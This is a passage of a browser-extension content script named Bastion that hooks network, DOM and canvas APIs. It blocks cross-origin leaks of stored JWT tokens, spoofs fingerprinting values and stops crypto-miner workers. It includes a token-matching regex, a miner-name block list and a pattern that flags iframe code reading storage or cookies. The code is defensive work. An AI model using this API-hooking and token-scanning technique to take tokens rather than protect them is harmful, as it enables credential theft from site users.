/**
 * Bastion — Injected Script (MAIN world)
 * Anti-exfil, anti-fingerprint, form spy, anti-miner
 */

(function () {
  'use strict';

  const JWT_PATTERN = /eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}/g;
  const currentBaseDomain = getBaseDomain(location.hostname);

  // Fallback until settings-preload.js answers the handshake below; it sends
  // the shared defaults synchronously, then the stored settings.
  let settings = {
    blockExfil: true,
    antiFingerprint: true,
    formSpy: true,
    antiMiner: true,
    antiWebRTC: true,
    antiKeylogger: true,
    antiTabNapping: true,
    clipboardGuard: true,
    blockJavascriptUrls: false,
    blockDataIframes: true
  };

  // Private channel to the ISOLATED world (see settings-preload.js). This runs
  // before any page script, so the page can't learn the channel name or have
  // patched the DOM primitives captured here.
  const _addEventListener = EventTarget.prototype.addEventListener;
  const _dispatchEvent = EventTarget.prototype.dispatchEvent;
  const _CustomEvent = CustomEvent;
  const _stringify = JSON.stringify;
  const _parse = JSON.parse;
  const CHANNEL = 'bastion:' + (crypto.randomUUID
    ? crypto.randomUUID()
    : Array.from(crypto.getRandomValues(new Uint32Array(4)), (n) => n.toString(36)).join(''));

  _addEventListener.call(document, CHANNEL + ':settings', (e) => {
    try {
      const incoming = _parse(e.detail);
      for (const k of Object.keys(settings)) {
        if (typeof incoming[k] === 'boolean') settings[k] = incoming[k];
      }
    } catch {}
  });
  _dispatchEvent.call(document, new _CustomEvent('bastion:hello', { detail: CHANNEL }));

  function getBaseDomain(hostname) {
    const parts = hostname.split('.');
    const doubleTlds = ['co.uk','com.br','co.jp','com.au','co.in','co.kr','co.nz','com.cn','com.mx','com.tr','org.uk','net.uk'];
    const last2 = parts.slice(-2).join('.');
    if (doubleTlds.includes(last2) && parts.length >= 3) return parts.slice(-3).join('.');
    return parts.slice(-2).join('.');
  }

  function isCrossOrigin(url) {
    try {
      return getBaseDomain(new URL(url, location.href).hostname) !== currentBaseDomain;
    } catch { return false; }
  }

  function notify(type, detail) {
    try {
      _dispatchEvent.call(document, new _CustomEvent(CHANNEL + ':event', { detail: _stringify({ ...detail, type }) }));
    } catch {}
  }

  function alertExfil(method, url, where) {
    const detail = {
      type: 'TG_EXFIL_ALERT', method,
      url: String(url).substring(0, 200), where,
      timestamp: Date.now(), blocked: settings.blockExfil
    };
    notify('TG_EXFIL_ALERT', detail);
    return settings.blockExfil;
  }

  // =============================================
  // 1. ANTI-EXFILTRATION — Smart Token Matching
  // =============================================
  // Instead of flagging ANY eyJ... pattern (false positives from analytics/base64),
  // we collect actual tokens from localStorage/sessionStorage and only alert when
  // one of THOSE specific tokens appears in a cross-origin request.

  let _cachedTokens = null;
  let _cacheTime = 0;
  // Shadow copy: remembers tokens even if attacker clears storage before exfil
  const _shadowTokens = new Set();

  function getStoredTokens() {
    // Cache for 10 seconds — storage reads are sync but no need to do it on every request
    if (_cachedTokens && Date.now() - _cacheTime < 10000) return _cachedTokens;
    const tokens = new Set();
    try {
      for (let i = 0; i < localStorage.length; i++) {
        const v = localStorage.getItem(localStorage.key(i));
        if (v) {
          JWT_PATTERN.lastIndex = 0;
          let m;
          while ((m = JWT_PATTERN.exec(v)) !== null) tokens.add(m[0]);
        }
      }
      for (let i = 0; i < sessionStorage.length; i++) {
        const v = sessionStorage.getItem(sessionStorage.key(i));
        if (v) {
          JWT_PATTERN.lastIndex = 0;
          let m;
          while ((m = JWT_PATTERN.exec(v)) !== null) tokens.add(m[0]);
        }
      }
    } catch {}
    // Also scan document.cookie for JWTs
    try {
      const cookies = document.cookie.split(';');
      for (const c of cookies) {
        const val = c.substring(c.indexOf('=') + 1).trim();
        if (val) {
          JWT_PATTERN.lastIndex = 0;
          let m;
          while ((m = JWT_PATTERN.exec(val)) !== null) tokens.add(m[0]);
        }
      }
    } catch {}
    // Merge into shadow copy (persists even if storage is cleared)
    for (const t of tokens) _shadowTokens.add(t);
    // Cap shadow at 50 to prevent memory bloat
    if (_shadowTokens.size > 50) {
      const arr = [..._shadowTokens];
      arr.splice(0, arr.length - 50);
      _shadowTokens.clear();
      for (const t of arr) _shadowTokens.add(t);
    }
    // Return union: current storage + shadow
    const merged = new Set([...tokens, ..._shadowTokens]);
    _cachedTokens = merged;
    _cacheTime = Date.now();
    return merged;
  }

  function containsStoredToken(str) {
    if (!str || typeof str !== 'string') return false;
    const tokens = getStoredTokens();
    if (tokens.size === 0) return false;
    for (const token of tokens) {
      if (str.includes(token)) return true;
      // Anti-chunking: a full payload or signature part of the token in a
      // cross-origin request counts too. The header (part 0) is skipped: it is
      // identical for every token signed with the same algorithm.
      if (token.length > 50) {
        const parts = token.split('.');
        for (let i = 1; i < parts.length; i++) {
          if (parts[i].length > 20 && str.includes(parts[i])) return true;
        }
      }
    }
    // Check for base64-encoded tokens (only full JWTs, not short fragments)
    try {
      for (const token of tokens) {
        if (token.length < 50) continue;
        const b64 = btoa(token);
        if (b64.length > 20 && str.includes(b64)) return true;
        const b64url = b64.replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
        if (b64url.length > 20 && str.includes(b64url)) return true;
      }
    } catch {}
    return false;
  }

  // Extract string content from non-string body types (FormData, URLSearchParams, Blob, etc.)
  function bodyToString(body) {
    if (!body) return '';
    if (typeof body === 'string') return body;
    if (body instanceof URLSearchParams) return body.toString();
    if (body instanceof FormData) {
      let parts = [];
      body.forEach((val, key) => { if (typeof val === 'string') parts.push(key + '=' + val); });
      return parts.join('&');
    }
    // ArrayBuffer / TypedArray → try decode as UTF-8
    if (body instanceof ArrayBuffer || ArrayBuffer.isView(body)) {
      try { return new TextDecoder().decode(body); } catch {}
    }
    // Blob — can't read sync, but check if it was created from a string we can detect
    // (Blobs created from [string] store the string internally)
    if (body instanceof Blob) {
      // Flag for async check — body is Blob so we mark it
      body._tgBlob = true;
    }
    return '';
  }

  // Async Blob body checker — reads Blob content as text
  async function blobContainsToken(body) {
    if (!body || !(body instanceof Blob)) return false;
    try {
      const text = await body.text();
      return containsStoredToken(text);
    } catch { return false; }
  }

  const originalFetch = window.fetch;
  window.fetch = function (input, init) {
    try {
      const url = typeof input === 'string' ? input : input instanceof Request ? input.url : String(input);
      if (isCrossOrigin(url)) {
        let block = false;
        // Check URL for stored tokens
        if (containsStoredToken(url)) block = alertExfil('fetch', url, 'url') || block;
        // Check headers for stored tokens. Authorization is skipped: sending the
        // session token to the app's own API on another domain (Supabase,
        // Firebase, Auth0, ...) is the normal SPA pattern, not exfiltration.
        if (init && init.headers) {
          const hs = typeof init.headers === 'object'
            ? JSON.stringify(Object.fromEntries(
              [...(init.headers instanceof Headers ? init.headers.entries() : Object.entries(init.headers))]
                .filter(([k]) => String(k).toLowerCase() !== 'authorization')))
            : String(init.headers);
          if (containsStoredToken(hs)) block = alertExfil('fetch', url, 'headers') || block;
        }
        // Check body — handle both init.body and Request input body
        const bodyToCheck = (init && init.body) || (input instanceof Request ? input.body : null);
        if (bodyToCheck) {
          const bodyStr = bodyToString(bodyToCheck);
          if (bodyStr && containsStoredToken(bodyStr)) block = alertExfil('fetch', url, 'body') || block;
          // Async Blob check — if body is Blob, check asynchronously
          if (bodyToCheck instanceof Blob) {
            if (block) return Promise.reject(new Error('[Bastion] Blocked token exfiltration'));
            const _this = this; // save context for async callback
            const _args = [input, init];
            return blobContainsToken(bodyToCheck).then(hasToken => {
              if (hasToken) {
                const shouldBlock = alertExfil('fetch', url, 'body(blob)');
                if (shouldBlock) return Promise.reject(new Error('[Bastion] Blocked token exfiltration'));
              }
              return originalFetch.apply(_this, _args);
            });
          }
        }
        if (block) return Promise.reject(new Error('[Bastion] Blocked token exfiltration'));
      }
    } catch {}
    return originalFetch.apply(this, arguments);
  };

  const origOpen = XMLHttpRequest.prototype.open;
  const origSend = XMLHttpRequest.prototype.send;
  const origSetH = XMLHttpRequest.prototype.setRequestHeader;

  XMLHttpRequest.prototype.open = function (m, url) {
    this._tgUrl = String(url); this._tgCross = isCrossOrigin(this._tgUrl); this._tgH = '';
    return origOpen.apply(this, arguments);
  };
  XMLHttpRequest.prototype.setRequestHeader = function (n, v) {
    // Authorization skipped for the same reason as in fetch()
    if (this._tgCross && String(n).toLowerCase() !== 'authorization') this._tgH += n + ':' + v + '\n';
    return origSetH.apply(this, arguments);
  };
  XMLHttpRequest.prototype.send = function (body) {
    try {
      if (this._tgCross) {
        let block = false;
        if (containsStoredToken(this._tgUrl)) block = alertExfil('xhr', this._tgUrl, 'url') || block;
        if (containsStoredToken(this._tgH)) block = alertExfil('xhr', this._tgUrl, 'headers') || block;
        const xhrBody = bodyToString(body);
        if (xhrBody && containsStoredToken(xhrBody)) block = alertExfil('xhr', this._tgUrl, 'body') || block;
        if (block) throw new Error('[Bastion] Blocked token exfiltration');
      }
    } catch (e) { if (e.message.startsWith('[Bastion]')) throw e; }
    return origSend.apply(this, arguments);
  };

  // =============================================
  // 2. ANTI-FINGERPRINT (Canvas, WebGL, AudioContext, hardware)
  // =============================================
  // Patches are installed unconditionally and check settings.antiFingerprint at
  // call time, so toggling it in the popup applies without a reload and the
  // real values come back while it is off.
  let fpCount = 0;
  const _fpReported = new Set();

  function reportFingerprint(method) {
    fpCount++;
    // One event per API per page: fingerprinting scripts call these in loops.
    if (_fpReported.has(method)) return;
    _fpReported.add(method);
    notify('TG_FINGERPRINT', { method, count: fpCount, timestamp: Date.now() });
  }

  // Noise depends only on a per-page seed and the pixel position, so the same
  // canvas content always gives the same output during a page load; random
  // per-call noise would itself be a detectable signal.
  const _fpSeed = crypto.getRandomValues(new Uint32Array(1))[0];
  function noiseAt(i) {
    let x = (i ^ _fpSeed) >>> 0;
    x = Math.imul(x ^ (x >>> 16), 0x45d9f3b);
    x = Math.imul(x ^ (x >>> 16), 0x45d9f3b);
    return 1 + ((x ^ (x >>> 16)) & 1); // 1 or 2
  }
  function applyPixelNoise(d) {
    let modified = 0;
    for (let i = 0; i < d.length && modified < 10; i += 4) {
      if (d[i + 3] > 0) { // visible pixel
        const ch = i + (modified % 3); // rotate R, G, B
        d[ch] = (d[ch] + noiseAt(i)) % 256;
        modified++;
      }
    }
    return modified;
  }

  // WebGL fingerprint protection — random GPU profile per session
  // GPU profiles grouped by platform (must match User-Agent)
  const GPU_BY_PLATFORM = {
    mac: [
      { vendor: 'Google Inc. (Intel)', renderer: 'ANGLE (Intel, Intel Iris Plus Graphics 640, OpenGL 4.1)', maxTex: 16384, maxVP: 16384 },
      { vendor: 'Google Inc. (Intel)', renderer: 'ANGLE (Intel, Intel Iris Pro Graphics 6200, OpenGL 4.1)', maxTex: 16384, maxVP: 16384 },
      { vendor: 'Google Inc. (Intel)', renderer: 'ANGLE (Intel, Intel UHD Graphics 630, OpenGL 4.1)', maxTex: 16384, maxVP: 16384 },
      { vendor: 'Google Inc. (AMD)', renderer: 'ANGLE (AMD, AMD Radeon Pro 560, OpenGL 4.1)', maxTex: 16384, maxVP: 16384 },
      { vendor: 'Google Inc. (AMD)', renderer: 'ANGLE (AMD, AMD Radeon Pro 5500M, OpenGL 4.1)', maxTex: 16384, maxVP: 16384 },
      { vendor: 'Google Inc. (AMD)', renderer: 'ANGLE (AMD, AMD Radeon Pro 5300M, OpenGL 4.1)', maxTex: 16384, maxVP: 16384 },
      { vendor: 'Google Inc. (Apple)', renderer: 'ANGLE (Apple, Apple M1, OpenGL 4.1)', maxTex: 16384, maxVP: 16384 },
      { vendor: 'Google Inc. (Apple)', renderer: 'ANGLE (Apple, Apple M2, OpenGL 4.1)', maxTex: 16384, maxVP: 16384 },
      { vendor: 'Google Inc. (Apple)', renderer: 'ANGLE (Apple, Apple M3, OpenGL 4.1)', maxTex: 16384, maxVP: 16384 },
    ],
    win: [
      { vendor: 'Google Inc. (NVIDIA)', renderer: 'ANGLE (NVIDIA, NVIDIA GeForce GTX 1650, OpenGL 4.5)', maxTex: 16384, maxVP: 16384 },
      { vendor: 'Google Inc. (NVIDIA)', renderer: 'ANGLE (NVIDIA, NVIDIA GeForce RTX 3060, OpenGL 4.5)', maxTex: 32768, maxVP: 32768 },
      { vendor: 'Google Inc. (NVIDIA)', renderer: 'ANGLE (NVIDIA, NVIDIA GeForce RTX 4070, OpenGL 4.5)', maxTex: 32768, maxVP: 32768 },
      { vendor: 'Google Inc. (AMD)', renderer: 'ANGLE (AMD, AMD Radeon RX 580, OpenGL 4.5)', maxTex: 16384, maxVP: 16384 },
      { vendor: 'Google Inc. (AMD)', renderer: 'ANGLE (AMD, AMD Radeon RX 6700 XT, OpenGL 4.5)', maxTex: 16384, maxVP: 16384 },
      { vendor: 'Google Inc. (Intel)', renderer: 'ANGLE (Intel, Intel UHD Graphics 770, OpenGL 4.5)', maxTex: 16384, maxVP: 16384 },
    ],
    linux: [
      { vendor: 'Google Inc. (NVIDIA)', renderer: 'ANGLE (NVIDIA, NVIDIA GeForce GTX 1080, OpenGL 4.5)', maxTex: 16384, maxVP: 16384 },
      { vendor: 'Google Inc. (AMD)', renderer: 'ANGLE (AMD, AMD Radeon RX 570, OpenGL 4.5)', maxTex: 16384, maxVP: 16384 },
      { vendor: 'Google Inc. (Intel)', renderer: 'ANGLE (Intel, Intel HD Graphics 530, OpenGL 4.5)', maxTex: 16384, maxVP: 16384 },
    ]
  };
  const _platform = navigator.platform || '';
  const _gpuSet = _platform.includes('Mac') ? GPU_BY_PLATFORM.mac
    : _platform.includes('Linux') ? GPU_BY_PLATFORM.linux
    : GPU_BY_PLATFORM.win;
  const _gpuProfile = _gpuSet[_fpSeed % _gpuSet.length];

  // WebGL hardware param spoofing map
  const _glParamSpoof = {
    0x1F00: 'WebKit',                     // VENDOR
    0x1F01: 'WebKit WebGL',               // RENDERER
    0x9245: _gpuProfile.vendor,           // UNMASKED_VENDOR_WEBGL
    0x9246: _gpuProfile.renderer,         // UNMASKED_RENDERER_WEBGL
    0x0D33: _gpuProfile.maxTex,           // MAX_TEXTURE_SIZE
    0x851C: _gpuProfile.maxTex,           // MAX_CUBE_MAP_TEXTURE_SIZE
    0x84E8: _gpuProfile.maxVP,            // MAX_RENDERBUFFER_SIZE
    0x0D36: 32,                           // MAX_VERTEX_ATTRIBS (common)
    0x8869: 32,                           // MAX_VERTEX_UNIFORM_VECTORS
    0x8DFB: 32,                           // MAX_VARYING_VECTORS
    0x8872: 16,                           // MAX_TEXTURE_IMAGE_UNITS
    0x8B4C: 16,                           // MAX_VERTEX_TEXTURE_IMAGE_UNITS
    0x8B4D: 16,                           // MAX_COMBINED_TEXTURE_IMAGE_UNITS → actually should be 32
  };
  _glParamSpoof[0x8B4D] = 32;            // MAX_COMBINED = vertex + fragment

  const _createElement = Document.prototype.createElement;
  const origGetContext = HTMLCanvasElement.prototype.getContext;
  const origToDataURL = HTMLCanvasElement.prototype.toDataURL;
  const origToBlob = HTMLCanvasElement.prototype.toBlob;
  const origDrawImage = CanvasRenderingContext2D.prototype.drawImage;
  const origGetImageData = CanvasRenderingContext2D.prototype.getImageData;
  const origPutImageData = CanvasRenderingContext2D.prototype.putImageData;

  // Noised copy of a canvas for export; the page's own canvas is never touched.
  // null means "export the original": protection off, empty canvas, or a
  // tainted one (the original call then throws exactly as it would natively).
  function noisyCopy(canvas) {
    if (!settings.antiFingerprint || !(canvas.width > 0 && canvas.height > 0)) return null;
    try {
      const copy = _createElement.call(document, 'canvas');
      copy.width = canvas.width;
      copy.height = canvas.height;
      const ctx = origGetContext.call(copy, '2d');
      origDrawImage.call(ctx, canvas, 0, 0);
      const img = origGetImageData.call(ctx, 0, 0, Math.min(copy.width, 64), Math.min(copy.height, 64));
      if (applyPixelNoise(img.data) > 0) origPutImageData.call(ctx, img, 0, 0);
      return copy;
    } catch { return null; }
  }

  // Canvas + WebGL patches for a window (the page itself and same-origin iframes).
  function patchCanvasApis(win) {
    const canvasProto = win.HTMLCanvasElement.prototype;
    const toDataURL = canvasProto.toDataURL;
    const toBlob = canvasProto.toBlob;
    canvasProto.toDataURL = function () {
      const copy = noisyCopy(this);
      if (!copy) return toDataURL.apply(this, arguments);
      reportFingerprint('canvas.toDataURL');
      return origToDataURL.apply(copy, arguments);
    };
    canvasProto.toBlob = function () {
      const copy = noisyCopy(this);
      if (!copy) return toBlob.apply(this, arguments);
      reportFingerprint('canvas.toBlob');
      return origToBlob.apply(copy, arguments);
    };

    // Sites also hash raw pixels; getImageData returns a fresh copy, so noising it is safe.
    for (const Ctx of [win.CanvasRenderingContext2D, win.OffscreenCanvasRenderingContext2D]) {
      if (!Ctx) continue;
      const getImageData = Ctx.prototype.getImageData;
      Ctx.prototype.getImageData = function () {
        const imageData = getImageData.apply(this, arguments);
        if (settings.antiFingerprint && imageData && imageData.data && imageData.data.length > 0) {
          applyPixelNoise(imageData.data);
          reportFingerprint('canvas.getImageData');
        }
        return imageData;
      };
    }

    for (const GL of [win.WebGLRenderingContext, win.WebGL2RenderingContext]) {
      if (!GL) continue;
      const getParameter = GL.prototype.getParameter;
      GL.prototype.getParameter = function (param) {
        if (settings.antiFingerprint && param in _glParamSpoof) {
          reportFingerprint('webgl.param.' + Number(param).toString(16));
          const fake = _glParamSpoof[param];
          if (typeof fake !== 'number') return fake;
          // Never report limits above what the GPU supports: apps size buffers
          // and textures from these and fail with INVALID_VALUE otherwise.
          const real = getParameter.apply(this, arguments);
          return typeof real === 'number' ? Math.min(real, fake) : real;
        }
        return getParameter.apply(this, arguments);
      };
    }
  }
  patchCanvasApis(window);

  if (typeof OffscreenCanvas !== 'undefined' && OffscreenCanvas.prototype.convertToBlob) {
    const origOCToBlob = OffscreenCanvas.prototype.convertToBlob;
    OffscreenCanvas.prototype.convertToBlob = function () {
      if (settings.antiFingerprint && this.width > 0 && this.height > 0) {
        try {
          const copy = new OffscreenCanvas(this.width, this.height);
          const ctx = copy.getContext('2d');
          ctx.drawImage(this, 0, 0);
          const img = ctx.getImageData(0, 0, Math.min(copy.width, 64), Math.min(copy.height, 64)); // noised by the patch above
          ctx.putImageData(img, 0, 0);
          reportFingerprint('offscreen.convertToBlob');
          return origOCToBlob.apply(copy, arguments);
        } catch {}
      }
      return origOCToBlob.apply(this, arguments);
    };
  }

  // Hardware: CPU cores, RAM, screen. Patched on the prototypes rather than as
  // own properties of navigator/screen.
  function spoofGetter(target, prop, fake) {
    const desc = Object.getOwnPropertyDescriptor(target, prop);
    if (!desc || !desc.get) return;
    const realGet = desc.get;
    Object.defineProperty(target, prop, {
      ...desc,
      get() { return settings.antiFingerprint ? fake : realGet.call(this); }
    });
  }
  spoofGetter(Navigator.prototype, 'hardwareConcurrency', [4, 8][_fpSeed & 1]);
  spoofGetter(Navigator.prototype, 'deviceMemory', 8); // most common value
  const fakeScreen = { width: 1920, height: 1080, availWidth: 1920, availHeight: 1040, colorDepth: 24, pixelDepth: 24 };
  for (const [key, val] of Object.entries(fakeScreen)) spoofGetter(Screen.prototype, key, val);
  // Window outer size — consistent with the spoofed screen
  spoofGetter(window, 'outerWidth', 1920);
  spoofGetter(window, 'outerHeight', 1040);

  // AudioContext fingerprint protection
  if (window.AnalyserNode) {
    const audioNoise = ((_fpSeed % 1000) / 1000 - 0.5) * 0.0001;
    const origGetFloatFreq = AnalyserNode.prototype.getFloatFrequencyData;
    AnalyserNode.prototype.getFloatFrequencyData = function (arr) {
      const result = origGetFloatFreq.apply(this, arguments);
      if (settings.antiFingerprint && arr && arr.length > 0) {
        arr[0] += audioNoise;
        reportFingerprint('audio.frequencyData');
      }
      return result;
    };
  }

  // =============================================
  // 3. FORM SPY — отслеживание отправки форм на чужой домен
  // =============================================
  document.addEventListener('submit', function (e) {
    if (!settings.formSpy) return;

    const form = e.target;
    if (!(form instanceof HTMLFormElement)) return;

    const action = form.action || location.href;
    if (!isCrossOrigin(action)) return;

    // Проверяем — есть ли в форме поля пароля/карты
    const inputs = form.querySelectorAll('input');
    let hasSensitive = false;
    let sensitiveTypes = [];
    for (const inp of inputs) {
      const type = (inp.type || '').toLowerCase();
      const name = (inp.name || '').toLowerCase();
      if (type === 'password') { hasSensitive = true; sensitiveTypes.push('password'); }
      if (name.includes('card') || name.includes('ccn') || name.includes('creditcard')) { hasSensitive = true; sensitiveTypes.push('card'); }
      if (name.includes('cvv') || name.includes('cvc') || name.includes('csv')) { hasSensitive = true; sensitiveTypes.push('cvv'); }
      if (name.includes('ssn') || name.includes('social')) { hasSensitive = true; sensitiveTypes.push('ssn'); }
    }

    if (hasSensitive) {
      e.preventDefault();
      e.stopImmediatePropagation();

      const detail = {
        type: 'TG_FORM_BLOCK',
        action: action.substring(0, 200),
        fields: sensitiveTypes,
        timestamp: Date.now()
      };
      notify('TG_FORM_BLOCK', detail);
    }
  }, true);

  // Patch form.submit() — it does NOT fire the submit event!
  const origFormSubmit = HTMLFormElement.prototype.submit;
  HTMLFormElement.prototype.submit = function () {
    if (settings.formSpy) {
      const action = this.action || location.href;
      if (isCrossOrigin(action)) {
        // Check for sensitive fields
        const inputs = this.querySelectorAll('input');
        for (const inp of inputs) {
          const type = (inp.type || '').toLowerCase();
          const name = (inp.name || '').toLowerCase();
          if (type === 'password' || name.includes('card') || name.includes('cvv') || name.includes('ssn')) {
            notify('TG_FORM_BLOCK', { action: action.substring(0, 200), fields: [type || name], timestamp: Date.now() });
            return; // block
          }
        }
        // Check if form values contain stored tokens
        const formData = new FormData(this);
        const formStr = bodyToString(formData);
        if (containsStoredToken(formStr) || containsStoredToken(action)) {
          alertExfil('form.submit', action, 'body');
          if (settings.blockExfil) return; // block
        }
      }
    }
    return origFormSubmit.apply(this, arguments);
  };

  // =============================================
  // 4. ANTI-MINER (WebWorker monitoring)
  // =============================================
  const MINER_PATTERNS = [
    /coinhive/i, /cryptonight/i, /coin-?hive/i, /jsecoin/i,
    /cryptoloot/i, /minero/i, /webminer/i, /miner\.js/i,
    /deepminer/i, /coinimp/i, /crypto-?loot/i
  ];

  // Constructors are wrapped with a Proxy: statics, prototype, `new.target`
  // (subclasses) and the "requires new" check keep working as natively.
  function wrapConstructor(name, construct) {
    const Orig = window[name];
    if (typeof Orig !== 'function') return null;
    window[name] = new Proxy(Orig, { construct: (target, args, newTarget) => construct(target, args, newTarget) });
    return Orig;
  }

  function minerWorker(target, args, newTarget) {
    const url = args[0];
    const urlStr = typeof url === 'string' ? url : url instanceof URL ? url.href : '';
    if (settings.antiMiner && MINER_PATTERNS.some((pat) => pat.test(urlStr))) {
      notify('TG_MINER_BLOCK', { url: urlStr, timestamp: Date.now() });
      // Hand back an inert worker so the page's code keeps running
      const blob = new Blob([''], { type: 'application/javascript' });
      return Reflect.construct(target, [URL.createObjectURL(blob), args[1]], newTarget);
    }
    return Reflect.construct(target, args, newTarget);
  }
  wrapConstructor('Worker', minerWorker);
  wrapConstructor('SharedWorker', minerWorker);

  // =============================================
  // 5a. ANTI-EXFIL: navigator.sendBeacon
  // =============================================
  const origSendBeacon = navigator.sendBeacon;
  navigator.sendBeacon = function (url, data) {
    try {
      if (isCrossOrigin(url)) {
        const dataStr = bodyToString(data);
        if (containsStoredToken(String(url)) || containsStoredToken(dataStr)) {
          const block = alertExfil('sendBeacon', url, dataStr ? 'body' : 'url');
          if (block) return false;
        }
        // Blob bodies can't be read synchronously: queue the beacon after an
        // async check instead of dropping every Blob beacon (analytics, RUM).
        if (data instanceof Blob && getStoredTokens().size > 0) {
          const args = arguments;
          blobContainsToken(data).then((hasToken) => {
            if (hasToken && alertExfil('sendBeacon', url, 'body(blob)')) return;
            origSendBeacon.apply(navigator, args);
          });
          return true;
        }
      }
    } catch {}
    return origSendBeacon.apply(navigator, arguments);
  };

  // =============================================
  // 5b. ANTI-EXFIL: WebSocket
  // =============================================
  if (window.WebSocket) {
    const crossSockets = new WeakMap(); // socket → URL, for cross-origin sockets only
    wrapConstructor('WebSocket', (target, args, newTarget) => {
      const ws = Reflect.construct(target, args, newTarget);
      const wsUrl = String(args[0]);
      if (isCrossOrigin(wsUrl.replace(/^ws(s?):/, 'http$1:'))) {
        crossSockets.set(ws, wsUrl);
        if (containsStoredToken(wsUrl)) alertExfil('websocket', wsUrl, 'url');
      }
      return ws;
    });
    const origWsSend = WebSocket.prototype.send;
    WebSocket.prototype.send = function (data) {
      const wsUrl = crossSockets.get(this);
      if (wsUrl) {
        try {
          let dataStr = '';
          if (typeof data === 'string') dataStr = data;
          else if (data instanceof ArrayBuffer || ArrayBuffer.isView(data)) {
            try { dataStr = new TextDecoder().decode(data); } catch {}
          }
          // Blobs can't be read synchronously and delaying them would reorder
          // the stream, so they pass unchecked.
          if (dataStr && containsStoredToken(dataStr) && alertExfil('websocket', wsUrl, 'body')) return;
        } catch {}
      }
      return origWsSend.apply(this, arguments);
    };
  }

  // =============================================
  // 5c. ANTI-EXFIL: DOM elements (Image.src, Script.src, etc.)
  // =============================================
  function patchSrcSetter(proto, tag) {
    const desc = Object.getOwnPropertyDescriptor(proto, 'src');
    if (!desc || !desc.set) return;
    const origSet = desc.set;
    Object.defineProperty(proto, 'src', {
      ...desc,
      set(val) {
        try {
          const url = String(val);
          if (isCrossOrigin(url) && containsStoredToken(url)) {
            const block = alertExfil(tag + '.src', url, 'url');
            if (block) return; // don't set src
          }
        } catch {}
        origSet.call(this, val);
      }
    });
  }
  patchSrcSetter(HTMLImageElement.prototype, 'img');
  patchSrcSetter(HTMLScriptElement.prototype, 'script');

  // Patch link.href — <link rel="prefetch/stylesheet"> can exfiltrate via URL
  function patchHrefSetter(proto, tag) {
    const desc = Object.getOwnPropertyDescriptor(proto, 'href');
    if (!desc || !desc.set) return;
    const origSet = desc.set;
    Object.defineProperty(proto, 'href', {
      ...desc,
      set(val) {
        try {
          const url = String(val);
          if (isCrossOrigin(url) && containsStoredToken(url)) {
            const block = alertExfil(tag + '.href', url, 'url');
            if (block) return;
          }
        } catch {}
        origSet.call(this, val);
      }
    });
  }
  patchHrefSetter(HTMLLinkElement.prototype, 'link');
  patchHrefSetter(HTMLAnchorElement.prototype, 'a');

  // javascript: URLs that do nothing — the usual href of links driven by
  // click handlers. They are never blocked or rewritten.
  const NOOP_JS_URL = /^javascript:\s*(void\s*\(?\s*0\s*\)?\s*;?|;)?\s*$/i;
  function isBlockedJsUrl(value) {
    if (!settings.blockJavascriptUrls) return false;
    const v = String(value).trim();
    return /^javascript:/i.test(v) && !NOOP_JS_URL.test(v);
  }

  // data: documents in iframes are a phishing vector; blob: URLs are always
  // same-origin (PDF previews, editors) and data: images/PDFs are inert.
  const HTML_LIKE_DATA = ['', 'text/html', 'application/xhtml+xml', 'image/svg+xml', 'text/xml', 'application/xml'];
  function isBlockedIframeSrc(value) {
    if (!settings.blockDataIframes) return false;
    const v = String(value).trim().toLowerCase();
    if (!v.startsWith('data:')) return false;
    return HTML_LIKE_DATA.includes(v.slice(5).split(/[;,]/)[0].trim());
  }

  function reportBlockedIframe(src) {
    notify('TG_DATA_IFRAME_BLOCK', { type: 'TG_DATA_IFRAME_BLOCK', src: String(src).substring(0, 100), timestamp: Date.now() });
  }

  // Also catch setAttribute('src' | 'href', ...)
  const origSetAttribute = Element.prototype.setAttribute;
  Element.prototype.setAttribute = function (name, value) {
    try {
      const attr = String(name).toLowerCase();
      if (attr === 'src' || attr === 'href') {
        if (attr === 'href' && isBlockedJsUrl(value)) {
          notify('TG_JS_URL_BLOCK', { type: 'TG_JS_URL_BLOCK', url: String(value).substring(0, 100), timestamp: Date.now() });
          return origSetAttribute.call(this, name, '#');
        }
        if (attr === 'src' && this.tagName === 'IFRAME' && isBlockedIframeSrc(value)) {
          reportBlockedIframe(value);
          return;
        }
        const url = String(value);
        if (isCrossOrigin(url) && containsStoredToken(url)) {
          const tag = this.tagName ? this.tagName.toLowerCase() : 'unknown';
          if (alertExfil(tag + '.' + attr, url, 'url')) return;
        }
      }
    } catch {}
    // outside the try: errors of the native call (e.g. invalid names) must reach the caller
    return origSetAttribute.apply(this, arguments);
  };

  // =============================================
  // 5d. ANTI-EXFIL: innerHTML / insertAdjacentHTML / document.write
  // =============================================
  // HTML parser bypasses .src setter and setAttribute patches,
  // so we scan HTML strings for token URLs before they get parsed.

  function scanHtmlForTokens(html) {
    if (!html || typeof html !== 'string') return false;
    // Quick check: does the HTML even contain src= or href= or ping= or srcdoc= ?
    if (!/(?:src|href|ping|action|srcdoc)\s*=\s*["']/i.test(html)) return false;
    // Extract URLs from attributes
    const urlMatch = /(?:src|href|ping|action)\s*=\s*["']([^"']+)["']/gi;
    let match;
    while ((match = urlMatch.exec(html)) !== null) {
      const url = match[1];
      try {
        if (isCrossOrigin(url) && containsStoredToken(url)) {
          return alertExfil('html_inject', url, 'url');
        }
      } catch {}
    }
    // Block iframe srcdoc that contains scripts reading storage (clean API bypass)
    if (/srcdoc\s*=\s*["'][^"']*(?:localStorage|sessionStorage|document\.cookie|parent\.|top\.)/i.test(html)) {
      notify('TG_EXFIL_ALERT', {
        type: 'TG_EXFIL_ALERT', method: 'iframe.srcdoc', url: location.href,
        where: 'srcdoc', timestamp: Date.now(), blocked: settings.blockExfil
      });
      return settings.blockExfil;
    }
    return false;
  }

  // Patch innerHTML setter
  const innerHTMLDesc = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
  if (innerHTMLDesc && innerHTMLDesc.set) {
    const origInnerHTMLSet = innerHTMLDesc.set;
    Object.defineProperty(Element.prototype, 'innerHTML', {
      ...innerHTMLDesc,
      set(val) {
        if (scanHtmlForTokens(val)) return; // block if settings.blockExfil
        origInnerHTMLSet.call(this, val);
      }
    });
  }

  // Patch outerHTML setter (same bypass as innerHTML)
  const outerHTMLDesc = Object.getOwnPropertyDescriptor(Element.prototype, 'outerHTML');
  if (outerHTMLDesc && outerHTMLDesc.set) {
    const origOuterHTMLSet = outerHTMLDesc.set;
    Object.defineProperty(Element.prototype, 'outerHTML', {
      ...outerHTMLDesc,
